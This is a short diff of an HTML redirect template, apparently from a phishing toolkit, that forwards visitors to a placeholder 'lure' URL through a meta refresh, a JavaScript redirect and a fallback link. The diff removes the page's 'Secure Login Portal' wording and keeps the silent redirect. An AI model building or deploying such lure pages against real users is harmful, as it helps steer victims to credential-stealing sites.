@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="refresh" content="0; url={{lure_url_html}}">
-    <title>Secure Login Redirect</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -28,15 +27,10 @@
     </style>
 </head>
 <body>
-    <h1>Secure Login Portal</h1>
-    <p>You are being redirected to the secure login page...</p>
     <div class="loader"></div>
     <p>If you are not redirected automatically, <a href="{lure_url_html}">click here</a>.</p>
-    
     <script>
-        // JavaScript redirect as backup (fires immediately)
         window.location.replace({lure_url_js});
-        
     </script>
 </body>
 </html>
